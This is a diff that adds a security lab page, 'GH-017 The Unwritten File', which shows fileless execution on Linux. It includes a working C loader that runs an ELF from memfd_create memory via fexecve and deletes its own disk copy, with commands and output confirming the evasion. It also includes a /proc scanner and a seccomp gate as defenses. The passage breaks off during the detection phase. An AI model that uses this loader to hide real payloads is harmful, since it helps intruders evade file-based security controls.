@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<title>GH-017 The Unwritten File (T1620): GHOSTLIGHT</title>
+<meta name="description" content="T1620 Reflective Code Loading, reproduced on Ubuntu 24.04: an attacker loads an ELF into anonymous memory with memfd_create and executes it with fexecve, so the payload runs with no file on disk. The defender detects it from the exe link that resolves to anonymous memory, contains it with evidence-first discipline, and demonstrates the seccomp gate that makes the loader fail closed.">
+<link rel="canonical" href="https://dillingerstaffing.github.io/ghostlight/ops/017-unwritten-file/">
+<meta property="og:title" content="GH-017 The Unwritten File (T1620): GHOSTLIGHT">
+<meta property="og:description" content="T1620 Reflective Code Loading, reproduced on Ubuntu 24.04: an attacker loads an ELF into anonymous memory with memfd_create and executes it with fexecve, so the payload runs with no file on disk. The defender detects it from the exe link that resolves to anonymous memory, contains it with evidence-first discipline, and demonstrates the seccomp gate that makes the loader fail closed.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dillingerstaffing.github.io/ghostlight/ops/017-unwritten-file/">
+<meta property="og:site_name" content="GHOSTLIGHT">
+<meta property="og:image" content="https://dillingerstaffing.github.io/ghostlight/og-card.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="GH-017 The Unwritten File (T1620): GHOSTLIGHT">
+<meta name="twitter:description" content="T1620 Reflective Code Loading, reproduced on Ubuntu 24.04: an attacker loads an ELF into anonymous memory with memfd_create and executes it with fexecve, so the payload runs with no file on disk. The defender detects it from the exe link that resolves to anonymous memory, contains it with evidence-first discipline, and demonstrates the seccomp gate that makes the loader fail closed.">
+<meta name="twitter:image" content="https://dillingerstaffing.github.io/ghostlight/og-card.png">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Crect width='512' height='512' fill='%23ece6d5'/%3E%3Ccircle cx='256' cy='196' r='104' fill='none' stroke='%23241f17' stroke-width='20'/%3E%3Cline x1='256' y1='152' x2='256' y2='240' stroke='%238c3f22' stroke-width='16'/%3E%3Cline x1='256' y1='300' x2='256' y2='424' stroke='%23241f17' stroke-width='14'/%3E%3Cline x1='200' y1='424' x2='312' y2='424' stroke='%23241f17' stroke-width='18'/%3E%3C/svg%3E">
+
+<link rel="apple-touch-icon" href="../../assets/apple-touch-icon.png">
+<link rel="manifest" href="../../assets/manifest.webmanifest">
+<meta name="theme-color" content="#0a0c0f">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="GHOSTLIGHT">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Oswald:wght@500;600;700&display=swap" rel="stylesheet">
+<script>
+(function () {
+  // Theme: notebook is the default; a stored visitor choice wins.
+  // Runs before the stylesheet is parsed so the first paint is already
+  // the right theme (no flash of the wrong one).
+  try {
+    var t = localStorage.getItem('emi-site-theme');
+    var theme = t === 'classic' ? 'classic' : 'notebook';
+    document.documentElement.dataset.theme = theme;
+    var m = document.querySelector('meta[name="theme-color"]');
+    if (m) m.setAttribute('content', theme === 'classic' ? '#0a0c0f' : '#ece6d5');
+  } catch (e) {
+    document.documentElement.dataset.theme = 'notebook';
+  }
+})();
+</script>
+<link rel="stylesheet" href="../../assets/site.css?v=36a0084f">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"TechArticle","headline":"GH-017 The Unwritten File (T1620): GHOSTLIGHT",
+"url":"https://dillingerstaffing.github.io/ghostlight/ops/017-unwritten-file/","description":"T1620 Reflective Code Loading, reproduced on Ubuntu 24.04: an attacker loads an ELF into anonymous memory with memfd_create and executes it with fexecve, so the payload runs with no file on disk. The defender detects it from the exe link that resolves to anonymous memory, contains it with evidence-first discipline, and demonstrates the seccomp gate that makes the loader fail closed.",
+"author":{"@type":"Person","name":"Chris Dillinger","url":"https://www.linkedin.com/in/christopherdillinger/"},
+"inLanguage":"en"}
+</script>
+</head>
+<body>
+
+<header class="site-header">
+  <a class="brand" href="../../index.html" aria-label="GHOSTLIGHT home">
+    <svg viewBox="0 0 32 32" aria-hidden="true"><circle cx="16" cy="16" r="12.5" fill="none" stroke="#e0642a" stroke-width="2.6"/><rect x="14.6" y="5.5" width="2.8" height="21" fill="#e0642a"/></svg>
+    <span class="brand-name">GHOSTLIGHT</span>
+  </a>
+  <nav class="site-nav">
+    <a href="../../method.html">METHOD</a>
+    <a href="../../index.html">FILES</a>
+    <button class="theme-toggle" type="button" aria-label="Switch to dark field dossier theme" title="Switch theme">
+      <span class="theme-toggle-mark" aria-hidden="true"><i></i><i></i></span>
+    </button>
+  </nav>
+</header>
+
+<div class="onboard" data-onboard hidden>
+  <span><strong>How to read a file:</strong> every file follows the six-phase structure below. <span class="k-green">Green</span> is verified, <span class="k-red">red</span> is hostile.</span>
+  <button aria-label="Dismiss">GOT IT</button>
+</div>
+
+<div class="page" data-op="017">
+  <div class="wrap">
+    <section class="op-hero">
+      <div class="op-kicker">
+        <span class="case-no">GH-017</span>
+        <a class="tech-id" href="https://attack.mitre.org/techniques/T1620/" rel="noopener">T1620</a>
+        <span class="phase-tag red">PHASE RED INSIDE</span>
+      </div>
+      <h1>The Unwritten File</h1>
+      <p class="lede">The payload executes, but it was never a file on disk. memfd_create makes an anonymous memory file, the loader copies the ELF into it and runs it with fexecve, then unlinks even the staging copy it read from. This file runs that loading end to end, then detects the fileless process from the exe link that resolves to anonymous memory, contains it with evidence-first discipline, and demonstrates the seccomp gate that makes the loader fail closed.</p>
+      <div class="op-meta-grid">
+        <div class="op-meta"><span class="mlabel">Technique</span><span class="mvalue">Reflective Code Loading (T1620)</span></div>
+        <div class="op-meta"><span class="mlabel">Target OS</span><span class="mvalue">Ubuntu 24.04.5 LTS</span></div>
+        <div class="op-meta"><span class="mlabel">Toolchain</span><span class="mvalue">bash, gcc, coreutils</span></div>
+        <div class="op-meta"><span class="mlabel">Level</span><span class="mvalue">Advanced</span></div>
+        <div class="op-meta"><span class="mlabel">Time</span><span class="mvalue">30 min</span></div>
+      </div>
+      <div class="objectives">
+        <h2>OBJECTIVES</h2>
+        <ol>
+          <li data-phase="phase-red"><span class="box"></span>Load an ELF into anonymous memory with memfd_create and execute it with fexecve, leaving no file on disk</li>
+          <li data-phase="phase-blue"><span class="box"></span>Detect the fileless process from /proc/PID/exe and the memfd mappings, capture the evidence, contain it</li>
+          <li data-phase="countermeasures"><span class="box"></span>Scan /proc for memfd-backed executables on a schedule, gate memfd_create behind seccomp for sandboxed workloads</li>
+          <li data-phase="debrief"><span class="box"></span>Take the IOC checklist and the one-sentence lesson</li>
+        </ol>
+      </div>
+    </section>
+
+    <div class="op-layout">
+      <nav class="rail" aria-label="Phases">
+        <span class="mlabel">Phases</span>
+        <ol>
+          <li><a href="#intel-brief"><span class="pnum">01</span>INTEL BRIEF<span class="tick"></span></a></li>
+          <li><a href="#target-environment"><span class="pnum">02</span>TARGET ENV<span class="tick"></span></a></li>
+          <li><a href="#phase-red"><span class="pnum">03</span>PHASE RED<span class="tick"></span></a></li>
+          <li><a href="#phase-blue"><span class="pnum">04</span>PHASE BLUE<span class="tick"></span></a></li>
+          <li><a href="#countermeasures"><span class="pnum">05</span>COUNTERMEASURES<span class="tick"></span></a></li>
+          <li><a href="#debrief"><span class="pnum">06</span>DEBRIEF<span class="tick"></span></a></li>
+        </ol>
+      </nav>
+
+      <div class="op-content">
+        <section class="phase" id="intel-brief">
+          <div class="phase-head"><span class="phase-num">01</span><h2>Intel Brief</h2><span class="phase-tag neutral">CONTEXT</span></div>
+          <p class="lede">MITRE ATT&amp;CK <a href="https://attack.mitre.org/techniques/T1620/" rel="noopener">T1620</a>: adversaries load code into memory and execute it without the code ever existing as a file on the filesystem, defeating every control that starts from the file inventory: blocklists, quarantine, integrity monitors. This file runs the Linux memfd_create variant end to end, then detects it from the one place the kernel cannot hide: the process's own executable mapping. Two actors: the attacker, who owns the loader, the payload bytes, and the anonymous file; and the defender, who owns the /proc reads, the scanner, the kill, and the seccomp gate in the blue phase.</p>
+          <div class="prose">
+            <p><strong>Why this technique.</strong> Every file-based control answers the same question: what is on this disk. A hash blocklist, a quarantine, an integrity monitor, a forensic image: all of them enumerate files. Reflective code loading changes the question by removing the file. The payload arrives as bytes (over the network, inside another process, it does not matter for this file), lands in anonymous memory, and executes. There is no path to blocklist, no file to quarantine, no directory entry for the monitor to hash. The defender who starts from the file inventory finds nothing, because there is nothing to find there. The detection has to move up a layer, from what is on the disk to what is executing.</p>
+            <p><strong>Why not run it from disk and delete it.</strong> The obvious alternative is the naive fileless: write the payload to /tmp, execute it, delete the file. Break it on the concrete input: between the write and the delete, the file exists with a directory entry, visible to any sweep, any integrity monitor, any forensic image taken in that window. And the delete itself leaves the directory-mtime scar GH-016 demonstrated: the parent directory's timestamp moves when the entry is removed. memfd_create never creates a directory entry at all. There is no window where the file exists, and no scar where it was removed, because nothing was ever written to the filesystem.</p>
+            <p><strong>Why not hide inside a host process.</strong> The other obvious alternatives are the earlier files' techniques: the LD_PRELOAD rootkit of GH-002, the ptrace injection of GH-003. Break them: both need a living host process to infect, and both leave their own artifacts, the preload library on disk, the injector's trace. The memfd payload is self-contained. It needs exactly one thing from the operating system, the anonymous file, and the dropper's single memfd_create call provides it. Fewer dependencies, fewer artifacts, a smaller surface for the defender to grip.</p>
+            <p><strong>Why not pipe it into a shell.</strong> The third alternative is curl | sh: fetch the script, pipe it to the interpreter, never write it down. Break it: the interpreter is a real file with a real exe link. Only the script is remote; the thing doing the executing is /bin/sh, sitting on disk, hashed and inventoried like everything else. The memfd construction goes one layer deeper: not just the script but the EXECUTED IMAGE is anonymous. /proc/PID/exe does not resolve to a path at all.</p>
+            <p><strong>The mechanism, in one line.</strong> An <strong>anonymous file</strong> is a file with no directory entry: it exists only as long as something holds it open, reachable solely through its file descriptor. A <strong>file descriptor</strong> is the kernel's handle for an open file: the small integer a process passes to read, write, and execute. <strong>memfd_create</strong> is the syscall that makes an anonymous memory-backed file and returns its descriptor. <strong>fexecve</strong> executes the program held open on a file descriptor, replacing the calling process. <strong>Reflective code loading</strong> is running code that was loaded into memory without ever existing as a filesystem file. Terms earned, no borrowing.</p>
+            <p><strong>The concrete case, before the abstraction.</strong> In /tmp/gh017: payload.c prints a marker and sleeps, compiled to the payload ELF. loader.c calls memfd_create("ghost-payload", MFD_CLOEXEC), copies the ELF bytes into the descriptor, unlinks the disk copy it read from, and calls fexecve on the descriptor. After: ls shows no payload file, ps shows the process under its argv[0] name, and readlink /proc/PID/exe prints /memfd:ghost-payload (deleted). One syscall, one anonymous file, one exe link that resolves to memory instead of a path.</p>
+          </div>
+          <div class="callout"><p><strong>Scope.</strong> T1620 covers reflective loading broadly: memfd_create on Linux, anonymous mappings with PROT_EXEC, process hollowing and injection on other platforms. This file works the Linux memfd_create case end to end: the loader, the unlink, the fexecve, the /proc detection, the evidence-first containment, the whole-host scanner, and the seccomp gate. The payload is a benign stand-in that prints a marker and sleeps: it proves execution and touches nothing else. The lab runs in a disposable namespace because the technique's whole point is leaving no filesystem trace; the /proc reads are the defender's independent observation path.</p></div>
+        </section>
+
+        <section class="phase" id="target-environment">
+          <div class="phase-head"><span class="phase-num">02</span><h2>Target Environment</h2><span class="phase-tag neutral">LOADOUT</span></div>
+          <p class="lede">Ubuntu 24.04.5 LTS, x86-64, in a disposable namespace used only for this lab. Runs as root: the lab compiles its own loader, payload, scanner, and seccomp gate inside /tmp/gh017, and every blue-phase read targets the live fileless process. Everything the lab touches lives inside /tmp/gh017, so cleanup is a single rm.</p>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <h3>Build the lab</h3>
+              <div class="prose"><p>One disposable directory, built from scratch. <strong>rm -rf /tmp/gh017</strong> clears any earlier take; <strong>mkdir -p</strong> makes the lab. Four sources go in through heredocs. <strong>payload.c</strong> is the benign stand-in: it prints "GHOSTLIGHT reflective payload executed (pid N)", flushes, and sleeps 600. It proves execution and touches nothing else. <strong>loader.c</strong> is the dropper: memfd_create with MFD_CLOEXEC, copy the ELF bytes from the staging path into the descriptor, close and unlink the staging copy, then fexecve the descriptor with argv[0] set to "ghost-payload". The executed program was never a file at exec time. <strong>scan.sh</strong> is the detector: it walks /proc/[0-9]*, readlinks each exe, and flags any that resolve to /memfd:*. <strong>gate.c</strong> is the prevention: a raw-BPF seccomp filter that returns EPERM for the memfd_create syscall number and allows everything else, installed with NO_NEW_PRIVS before execing its target. <strong>gcc -O2</strong> builds all three binaries; the final <strong>ls -l</strong> proves the lab built.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="rm -rf /tmp/gh017 &amp;&amp; mkdir -p /tmp/gh017 &amp;&amp; cd /tmp/gh017 &amp;&amp; cat &gt; payload.c &lt;&lt;'EOF'&#10;#include &lt;stdio.h&gt;&#10;#include &lt;unistd.h&gt;&#10;/* Benign stand-in: proves execution, touches nothing. */&#10;int main(void) {&#10;    printf(&quot;GHOSTLIGHT reflective payload executed (pid %d)\n&quot;, getpid());&#10;    fflush(stdout);&#10;    sleep(600);&#10;    return 0;&#10;}&#10;EOF&#10;cat &gt; loader.c &lt;&lt;'EOF'&#10;#define _GNU_SOURCE&#10;#include &lt;sys/mman.h&gt;&#10;#include &lt;fcntl.h&gt;&#10;#include &lt;unistd.h&gt;&#10;#include &lt;stdio.h&gt;&#10;/* Dropper: anonymous file, copy the ELF in, unlink the staging copy,&#10;   execute from the descriptor. The payload is never a file at exec time. */&#10;int main(int argc, char **argv, char **envp) {&#10;    if (argc &lt; 2) { fprintf(stderr, &quot;usage: %s &lt;payload-elf&gt;\n&quot;, argv[0]); return 2; }&#10;    int mfd = memfd_create(&quot;ghost-payload&quot;, MFD_CLOEXEC);&#10;    if (mfd &lt; 0) { perror(&quot;memfd_create&quot;); return 1; }&#10;    int pfd = open(argv[1], O_RDONLY);&#10;    if (pfd &lt; 0) { perror(&quot;open payload&quot;); return 1; }&#10;    char buf[65536]; ssize_t n;&#10;    while ((n = read(pfd, buf, sizeof buf)) &gt; 0)&#10;        if (write(mfd, buf, n) != n) { perror(&quot;write&quot;); return 1; }&#10;    close(pfd);&#10;    unlink(argv[1]);&#10;    char *args[] = { &quot;ghost-payload&quot;, NULL };&#10;    fexecve(mfd, args, envp);&#10;    perror(&quot;fexecve&quot;);&#10;    return 1;&#10;}&#10;EOF&#10;cat &gt; scan.sh &lt;&lt;'EOF'&#10;#!/bin/sh&#10;# memfd-scan: flag processes whose executable is anonymous memory.&#10;# Good: every exe resolves to a real path. Bad: exe is /memfd:*.&#10;found=0&#10;for d in /proc/[0-9]*; do&#10;    exe=$(readlink &quot;$d/exe&quot; 2&gt;/dev/null) || continue&#10;    case &quot;$exe&quot; in&#10;        /memfd:*)&#10;            pid=${d#/proc/}&#10;            cmd=$(tr '\0' ' ' &lt; &quot;$d/cmdline&quot; 2&gt;/dev/null)&#10;            echo &quot;SUSPECT pid=$pid exe='$exe' cmd='$cmd'&quot;&#10;            found=1 ;;&#10;    esac&#10;done&#10;[ &quot;$found&quot; -eq 0 ] &amp;&amp; echo &quot;clean: no memfd-backed executables&quot;&#10;EOF&#10;cat &gt; gate.c &lt;&lt;'EOF'&#10;#define _GNU_SOURCE&#10;#include &lt;linux/seccomp.h&gt;&#10;#include &lt;linux/filter.h&gt;&#10;#include &lt;linux/audit.h&gt;&#10;#include &lt;sys/prctl.h&gt;&#10;#include &lt;sys/syscall.h&gt;&#10;#include &lt;stddef.h&gt;&#10;#include &lt;errno.h&gt;&#10;#include &lt;unistd.h&gt;&#10;#include &lt;stdio.h&gt;&#10;/* Prevention gate: memfd_create -&gt; EPERM, everything else allowed. */&#10;static struct sock_filter f[] = {&#10;    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),&#10;    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_memfd_create, 0, 1),&#10;    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),&#10;    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),&#10;};&#10;static struct sock_fprog p = { .len = sizeof(f)/sizeof(f[0]), .filter = f };&#10;int main(int argc, char **argv) {&#10;    if (argc &lt; 2) { fprintf(stderr, &quot;usage: %s &lt;prog&gt; [args]\n&quot;, argv[0]); return 2; }&#10;    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) { perror(&quot;no_new_privs&quot;); return 1; }&#10;    if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &amp;p)) { perror(&quot;seccomp&quot;); return 1; }&#10;    execvp(argv[1], argv + 1);&#10;    perror(&quot;execvp&quot;);&#10;    return 1;&#10;}&#10;EOF&#10;gcc -O2 -o payload payload.c &amp;&amp; gcc -O2 -o loader loader.c &amp;&amp; gcc -O2 -o gate gate.c &amp;&amp; chmod +x scan.sh &amp;&amp; echo &quot;lab built: /tmp/gh017&quot;; ls -l /tmp/gh017"><span data-label>COPY</span></button></div>
+<pre>$ rm -rf /tmp/gh017 &amp;&amp; mkdir -p /tmp/gh017 &amp;&amp; cd /tmp/gh017 &amp;&amp; cat &gt; payload.c &lt;&lt;'EOF'
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+/* Benign stand-in: proves execution, touches nothing. */
+int main(void) {
+    printf("GHOSTLIGHT reflective payload executed (pid %d)\n", getpid());
+    fflush(stdout);
+    sleep(600);
+    return 0;
+}
+EOF
+cat &gt; loader.c &lt;&lt;'EOF'
+#define _GNU_SOURCE
+#include &lt;sys/mman.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+/* Dropper: anonymous file, copy the ELF in, unlink the staging copy,
+   execute from the descriptor. The payload is never a file at exec time. */
+int main(int argc, char **argv, char **envp) {
+    if (argc &lt; 2) { fprintf(stderr, "usage: %s &lt;payload-elf&gt;\n", argv[0]); return 2; }
+    int mfd = memfd_create("ghost-payload", MFD_CLOEXEC);
+    if (mfd &lt; 0) { perror("memfd_create"); return 1; }
+    int pfd = open(argv[1], O_RDONLY);
+    if (pfd &lt; 0) { perror("open payload"); return 1; }
+    char buf[65536]; ssize_t n;
+    while ((n = read(pfd, buf, sizeof buf)) &gt; 0)
+        if (write(mfd, buf, n) != n) { perror("write"); return 1; }
+    close(pfd);
+    unlink(argv[1]);
+    char *args[] = { "ghost-payload", NULL };
+    fexecve(mfd, args, envp);
+    perror("fexecve");
+    return 1;
+}
+EOF
+cat &gt; scan.sh &lt;&lt;'EOF'
+#!/bin/sh
+# memfd-scan: flag processes whose executable is anonymous memory.
+# Good: every exe resolves to a real path. Bad: exe is /memfd:*.
+found=0
+for d in /proc/[0-9]*; do
+    exe=$(readlink "$d/exe" 2&gt;/dev/null) || continue
+    case "$exe" in
+        /memfd:*)
+            pid=${d#/proc/}
+            cmd=$(tr '\0' ' ' &lt; "$d/cmdline" 2&gt;/dev/null)
+            echo "SUSPECT pid=$pid exe='$exe' cmd='$cmd'"
+            found=1 ;;
+    esac
+done
+[ "$found" -eq 0 ] &amp;&amp; echo "clean: no memfd-backed executables"
+EOF
+cat &gt; gate.c &lt;&lt;'EOF'
+#define _GNU_SOURCE
+#include &lt;linux/seccomp.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/audit.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;stddef.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+/* Prevention gate: memfd_create -&gt; EPERM, everything else allowed. */
+static struct sock_filter f[] = {
+    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
+    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_memfd_create, 0, 1),
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+};
+static struct sock_fprog p = { .len = sizeof(f)/sizeof(f[0]), .filter = f };
+int main(int argc, char **argv) {
+    if (argc &lt; 2) { fprintf(stderr, "usage: %s &lt;prog&gt; [args]\n", argv[0]); return 2; }
+    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) { perror("no_new_privs"); return 1; }
+    if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &amp;p)) { perror("seccomp"); return 1; }
+    execvp(argv[1], argv + 1);
+    perror("execvp");
+    return 1;
+}
+EOF
+gcc -O2 -o payload payload.c &amp;&amp; gcc -O2 -o loader loader.c &amp;&amp; gcc -O2 -o gate gate.c &amp;&amp; chmod +x scan.sh &amp;&amp; echo "lab built: /tmp/gh017"; ls -l /tmp/gh017
+lab built: /tmp/gh017
+total 68
+-rwxrwx--- 1 root root 16336 Sep 23 00:15 gate
+-rw-rw---- 1 root root  1030 Sep 23 00:15 gate.c
+-rwxrwx--- 1 root root 16440 Sep 23 00:15 loader
+-rw-rw---- 1 root root   889 Sep 23 00:15 loader.c
+-rwxrwx--- 1 root root 16144 Sep 23 00:15 payload
+-rw-rw---- 1 root root   241 Sep 23 00:15 payload.c
+-rwxrwx--- 1 root root   511 Sep 23 00:15 scan.sh</pre>
+</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <h3>The obvious alternative, broken on a concrete input</h3>
+              <div class="prose"><p>Before the real attack, watch the naive version fail. <strong>cp payload runme</strong> puts the payload on disk under a new name; <strong>./runme &amp;</strong> backgrounds it; the marker prints. Then the failure, concrete: <strong>ls -l /tmp/gh017/runme</strong> shows the file, 16144 bytes, sitting there for any sweep, any integrity monitor, any forensic image to find. <strong>kill</strong> stops it, <strong>rm</strong> removes it. Disk execution leaves a directory entry between the write and the delete, and the delete leaves the mtime scar. That is the failure the memfd construction exists to fix.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- the obvious alternative: run it from disk ---&quot;; cp payload runme &amp;&amp; ./runme &gt; runme.out 2&gt;&amp;1 &amp; RPID=$!; sleep 1; cat runme.out; echo &quot;--- the failure: the file is right there for any sweep ---&quot;; ls -l /tmp/gh017/runme; kill $RPID 2&gt;/dev/null; rm -f runme runme.out; echo &quot;(disk execution leaves a directory entry; that is what we fix next)&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- the obvious alternative: run it from disk ---"; cp payload runme &amp;&amp; ./runme &gt; runme.out 2&gt;&amp;1 &amp; RPID=$!; sleep 1; cat runme.out; echo "--- the failure: the file is right there for any sweep ---"; ls -l /tmp/gh017/runme; kill $RPID 2&gt;/dev/null; rm -f runme runme.out; echo "(disk execution leaves a directory entry; that is what we fix next)"
+--- the obvious alternative: run it from disk ---
+[1] 27
+GHOSTLIGHT reflective payload executed (pid 30)
+--- the failure: the file is right there for any sweep ---
+-rwxrwx--- 1 root root 16144 Sep 23 00:15 /tmp/gh017/runme
+(disk execution leaves a directory entry; that is what we fix next)</pre>
+</div>
+            </div>
+          </div>
+        </section>
+
+        <section class="phase" id="phase-red">
+          <div class="phase-head"><span class="phase-num">03</span><h2>Phase Red: run the unwritten</h2><span class="phase-tag red">ATTACK</span></div>
+          <p class="lede">The loader runs the payload from anonymous memory, unlinks its own staging copy, and the exe link resolves to memory instead of a path.</p>
+          <figure class="recording reveal">
+            <div class="recording-bar">
+              <span class="rec-dot" aria-hidden="true"></span>
+              <span class="mlabel">Real screen recording</span>
+              <span class="dur">343.4s</span>
+            </div>
+            <video controls playsinline preload="metadata" poster="../../assets/vid/unwritten-red.jpg" aria-label="Screen recording: UNWRITTEN RED, operator@lab">
+              <source src="../../assets/vid/unwritten-red.mp4" type="video/mp4">
+            </video>
+            <figcaption class="recording-cap"><strong>What you are watching:</strong> A payload is executed from anonymous memory with no file on disk. The staging copy is unlinked by the loader itself. Every command below is copy-pasteable.</figcaption>
+          </figure>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <h3>The attack</h3>
+              <div class="prose"><p><strong>./loader ./payload &amp;</strong> backgrounds the dropper; fexecve replaces it with the payload, so the background job IS the payload now, and <strong>$!</strong> names its pid directly. The marker prints: the code is running. Then the inventory: <strong>ls /tmp/gh017/payload</strong> fails, no such file, because the loader unlinked its own staging copy after copying the bytes into the memfd. And the tell the attacker cannot remove: <strong>readlink /proc/$LPID/exe</strong> prints /memfd:ghost-payload (deleted). The executable is anonymous memory. The process table shows a name; the name resolves to nowhere on disk.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- the attack: execute from anonymous memory ---&quot;; ./loader ./payload &gt; payload.out 2&gt;&amp;1 &amp; LPID=$!; sleep 1; echo &quot;--- the payload ran:&quot;; cat payload.out; echo &quot;--- the staging copy:&quot;; ls /tmp/gh017/payload 2&gt;&amp;1 || echo '(gone: the loader unlinked it)'; echo &quot;payload pid: $LPID (fexecve replaced the loader in place)&quot;; echo &quot;--- what the executable resolves to:&quot;; readlink /proc/$LPID/exe"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- the attack: execute from anonymous memory ---"; ./loader ./payload &gt; payload.out 2&gt;&amp;1 &amp; LPID=$!; sleep 1; echo "--- the payload ran:"; cat payload.out; echo "--- the staging copy:"; ls /tmp/gh017/payload 2&gt;&amp;1 || echo '(gone: the loader unlinked it)'; echo "payload pid: $LPID (fexecve replaced the loader in place)"; echo "--- what the executable resolves to:"; readlink /proc/$LPID/exe
+--- the attack: execute from anonymous memory ---
+[1] 34
+--- the payload ran:
+GHOSTLIGHT reflective payload executed (pid 34)
+--- the staging copy:
+ls: cannot access '/tmp/gh017/payload': No such file or directory
+(gone: the loader unlinked it)
+payload pid: 34 (fexecve replaced the loader in place)
+--- what the executable resolves to:
+/memfd:ghost-payload (deleted)</pre>
+</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <h3>Stealth confirmed</h3>
+              <div class="prose"><p>Three echo lines, the attacker's summary: the code runs, but it was never a file; no directory entry existed at exec time, so no inventory can list it; the process table shows a name, but the name resolves to anonymous memory. The file listing is the wrong evidence to read, which is exactly what the blue phase exploits.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;stealth confirmed: the code runs, but it was never a file&quot;; echo &quot;no directory entry existed at exec time, so no inventory can list it&quot;; echo &quot;the process table shows a name; the name resolves to anonymous memory&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "stealth confirmed: the code runs, but it was never a file"; echo "no directory entry existed at exec time, so no inventory can list it"; echo "the process table shows a name; the name resolves to anonymous memory"
+stealth confirmed: the code runs, but it was never a file
+no directory entry existed at exec time, so no inventory can list it
+the process table shows a name; the name resolves to anonymous memory</pre>
+</div>
+              <div class="verdict red">
+                <span class="mlabel">Stealth confirmed</span>
+                <p>The payload executed from a memfd_create anonymous file via fexecve, the loader unlinked its own staging copy, and no file on disk corresponds to the running code: the file inventory is empty. The attack works because every file-based control enumerates files, and there is no file.</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section class="phase" id="phase-blue">
+          <div class="phase-head"><span class="phase-num">04</span><h2>Phase Blue: read the exe link</h2><span class="phase-tag blue">DEFENSE</span></div>
+          <p class="lede">The defender does not trust the file listing. The defender reads the process's own executable mapping: scan the whole host for anonymous executables, drill into the exe link and the mappings by hand, learn the CLOEXEC lesson from the descriptors, then record the evidence before containing.</p>
+          <div class="prose">
+            <p>Here is the trap: running ps, seeing the process, running ls, finding no file, and concluding the process must be legitimate because there is nothing to quarantine. That is trusting the file inventory the attacker just bypassed. The detection is the exe link: readlink /proc/PID/exe while the process is still running.</p>
+          </div>
+          <figure class="recording reveal">
+            <div class="recording-bar">
+              <span class="rec-dot blue" aria-hidden="true"></span>
+              <span class="mlabel">Real screen recording</span>
+              <span class="dur">240.6s</span>
+            </div>
+            <video controls playsinline preload="metadata" poster="../../assets/vid/unwritten-blue.jpg" aria-label="Screen recording: UNWRITTEN BLUE, operator@lab">
+              <source src="../../assets/vid/unwritten-blue.mp4" type="video/mp4">
+            </video>
+            <figcaption class="recording-cap"><strong>What you are watching:</strong> The defender detects the fileless process from its exe link and memory mappings, captures the evidence, contains it, and demonstrates the seccomp gate that makes the loader fail closed. Every command below is copy-pasteable.</figcaption>
+          </figure>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <h3>DETECTION: the naive view</h3>
+              <div class="prose"><p><strong>ps -ef | grep ghost-payload</strong> shows the process running: the naive view. <strong>ls -l /tmp/gh017</strong> shows the lab files and no payload: the file inventory says there is nothing to quarantine. Stopping here is the attacker's win, and it is exactly where file-based tooling stops. The independent path starts in the next step.</p></div>
+              <div class="codeblock codeblock-scrollhint">
